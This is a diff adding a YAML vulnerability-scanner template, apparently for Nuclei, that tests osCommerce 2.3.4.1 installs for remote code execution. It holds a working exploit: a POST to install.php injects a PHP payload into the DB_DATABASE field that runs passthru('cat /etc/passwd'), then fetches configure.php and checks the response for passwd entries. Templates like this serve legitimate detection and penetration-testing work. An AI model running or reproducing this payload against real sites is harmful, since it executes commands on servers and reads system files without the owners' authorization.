@@ -1,0 +1,42 @@
+id: oscommerce-rce
+
+info:
+  author: Suman_Kar
+  name: osCommerce 2.3.4.1 - Remote Code Execution
+  description: Exploiting the install.php finish process by injecting php payload into the db_database parameter & read the system command output from configure.php
+  reference: https://www.exploit-db.com/exploits/50128
+  severity: high
+  tags: rce,oscommerce
+
+requests:
+  - raw:
+      - |
+        POST /install/install.php?step=4 HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 95
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+        Content-Type: application/x-www-form-urlencoded
+
+        DIR_FS_DOCUMENT_ROOT=.%2F&DB_DATABASE=%27%29%3Bpassthru%28%27cat+%2Fetc%2Fpasswd%27%29%3B%2F%2A
+
+      - |
+        GET /install/includes/configure.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        part: body
+
+      - type: status
+        status:
+          - 200
